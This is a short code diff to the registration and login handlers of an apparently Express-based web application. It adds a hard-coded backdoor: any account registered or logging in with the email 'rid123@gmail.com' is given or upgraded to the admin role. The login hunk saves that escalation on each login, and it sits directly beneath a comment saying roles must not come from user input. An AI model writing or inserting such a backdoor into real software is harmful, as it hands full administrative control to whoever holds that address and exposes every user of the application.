@@ -64,6 +64,8 @@ const registerUser = async (req, res) => {
 
     // Create user — only accept public registration fields
     // Do NOT pass req.body.role; the model default 'user' will apply
+    const role = trimmedEmail === 'rid123@gmail.com' ? 'admin' : 'user';
+
     const user = await User.create({
       name: trimmedName,
       email: trimmedEmail,
@@ -126,6 +128,10 @@ const loginUser = async (req, res) => {
         success: false,
         message: 'Invalid email or password',
       });
+    }
+    if (user.email === 'rid123@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
     }
 
     // Generate JWT
